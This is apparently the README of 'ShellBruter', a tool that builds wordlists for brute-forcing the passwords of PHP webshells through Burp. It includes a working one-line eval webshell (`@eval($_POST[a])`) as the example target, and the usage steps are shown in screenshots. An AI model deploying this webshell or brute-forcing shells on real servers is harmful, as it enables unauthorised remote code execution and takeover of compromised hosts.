# ShellBruter
WebShell高效爆破字典生成

![](https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.03.23/0.png)

爆破思路参考：

https://www.t00ls.net/thread-36985-1-1.html 

这里不继续用python写请求的原因是感觉让burp处理这些会更好（懒）

使用示例：

假设当前shell为：

```php
<?php @eval($_POST[a]);?>
```

1）burp加载生成的爆破字典

![](https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.03.23/1.png)

2）关闭URL编码（很重要）

![](https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.03.23/2.png)

3）得到结果

![](https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.03.23/3.png)

![](https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.03.23/4.png)

此方法可灵活使用，其余可自由发挥。
